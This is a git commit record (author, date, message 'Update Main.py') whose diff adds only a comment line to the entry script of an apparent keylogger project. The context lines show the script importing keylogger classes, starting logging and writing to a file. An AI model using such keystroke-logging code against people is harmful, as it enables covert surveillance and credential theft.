5a4a56264a0911184ad001be87702e2938da3c45
danielzemtsovski <d0556789739@gmail.com>
2025-09-03 12:39:56 +0300

    Update Main.py

--- Main.py
+++ Main.py
@@ -3,7 +3,7 @@ from keylogger.KeyliggerServise.KeyloggerServise import KeyLogger
 from keylogger.writer.IWriter import FileWriter
 from keylogger.KeyLoggerManager.Manager import KeyLoggerManager
 
-
+#///#
 keylogger = KeyLogger()
 keylogger.start_logging()
 writer = FileWriter()
